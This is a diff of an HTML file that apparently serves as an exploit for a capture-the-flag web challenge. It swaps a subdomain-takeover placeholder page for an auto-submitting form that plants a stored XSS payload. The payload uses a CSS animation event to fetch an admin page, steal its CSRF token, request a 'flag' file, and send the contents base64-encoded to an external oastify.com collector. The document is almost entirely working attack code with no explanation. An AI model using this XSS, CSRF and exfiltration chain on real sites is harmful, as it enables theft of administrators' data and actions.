@@ -1,11 +1,19 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Subdomain Takeover</title>
-</head>
+<!doctype html>
+<html>
 <body>
-    <h1>taken over by shiftj</h1>
+<form id="f" action="http://web:8000/notes" method="POST">
+  <textarea name="body"><style>@keyframes x{}</style>
+<xss style="animation-name:x" onanimationstart="async function a(){
+  let r=await(await fetch('/admin')).text();
+  let t=r.match(/value=&quot;(.+?)&quot;/)[1];
+  let f=await(await fetch('/admin/file',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:`csrf=${t}&file=flag`})).text();
+  new Image().src='https://grb86k8jgt2pvodemslm6c427tdk1fp4.oastify.com/?flag=' + btoa(f);
+};a()"></xss></textarea>
+</form>
+
+<script>
+  f.submit();
+  setTimeout(() => location.href = "http://web:8000/", 300);
+</script>
 </body>
 </html>
